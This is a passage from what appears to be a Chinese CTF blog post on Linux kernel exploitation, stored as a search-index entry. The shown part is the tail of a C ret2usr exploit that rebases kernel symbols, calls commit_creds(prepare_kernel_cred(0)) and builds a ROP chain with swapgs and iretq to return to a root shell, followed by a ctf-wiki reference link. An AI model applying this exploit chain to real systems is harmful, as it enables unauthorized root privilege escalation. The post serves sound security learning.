swapgs += core_base;</span><br><span class="line">    iretq = 0x50ac2 + vmlinux_base;</span><br><span class="line">    commit_creds += vmlinux_base;</span><br><span class="line">    prepare_kernel_cred += vmlinux_base;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void privilege_escalation()&#123;</span><br><span class="line">    if(commit_creds &amp;&amp; prepare_kernel_cred)&#123;</span><br><span class="line">        (*((void (*)(char *))commit_creds))(</span><br><span class="line">            (*((char* (*)(int))prepare_kernel_cred))(0)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">   get_addr();</span><br><span class="line">   for(i=0;i&lt;10;i++)&#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    i = 10;</span><br><span class="line">    rop[i++] = (size_t)privilege_escalation;</span><br><span class="line">    rop[i++] = swapgs; //恢复用户GS寄存器</span><br><span class="line">    rop[i++] = 0;</span><br><span class="line">    rop[i++] = iretq;</span><br><span class="line">    rop[i++] = (size_t)get_shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    write(fd,rop,i*8);</span><br><span class="line">    core_copy_func(fd,0xf000000000000000+i*8);</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] Attack Success! .\033[0m&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250811132730535.png" alt="image-20250720202401158"></p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2usr/">https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2usr/</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel Pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
